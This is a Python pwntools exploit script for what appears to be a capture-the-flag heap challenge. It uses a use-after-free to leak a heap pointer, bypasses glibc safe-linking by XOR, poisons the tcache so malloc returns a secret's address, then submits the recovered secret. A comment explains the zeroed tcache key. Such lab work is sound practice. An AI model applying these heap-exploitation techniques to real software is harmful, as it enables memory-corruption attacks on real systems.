#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/seeking-safe-secrets-easy")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size):
    payload = b"read " + str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def xor_num(n1,n2):
    return n1 ^ n2

def main(io,secret_add):
    io = malloc(io,0,24)
    io = malloc(io,1,24)
    io = free(io,0)
    io = puts(io,0)
    print(io.recvuntil(b"Data: ").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(data))
    io = free(io,1)
    io = scanf(io,1,p64(xor_num(secret_add,data)))
    io = malloc(io,2,24)
    io = malloc(io,3,24)
    io = malloc(io,4,24)
    io = free(io,4)
    io = puts(io,4)
    print(io.recvuntil(b"Data: ").decode())
    d = int.from_bytes(io.recvline()[:-1][:8],"little")
    print(hex(d))
    actual_secret = d ^ (secret_add >> 12)  ^ data
    secret = actual_secret.to_bytes(8,"little")
    print(secret)
    return io,secret

if __name__ == "__main__":
    add = 0x43bbc0
    io = process()
    io,secret1 = main(io,add)
    secret2 = b"\x00" * 8
    """why next 8 byte of key is null?
        -> Because when you read the malloc code carefullly from tacache one they you find that e->key = 0 so when malloc happen
            and if malloc is sucess then it put that key to null and here in our challenge also first malloc is done adn then the ptr reurn by the malloc is compared with the address 0x430000 that mean malloc is sucess on that secret address so it put 0 to key means in next 8 byte secret the value become null"""
    secret = secret1 + secret2
    io = send_flag(io,secret)
    io = quit(io)

    io.interactive()
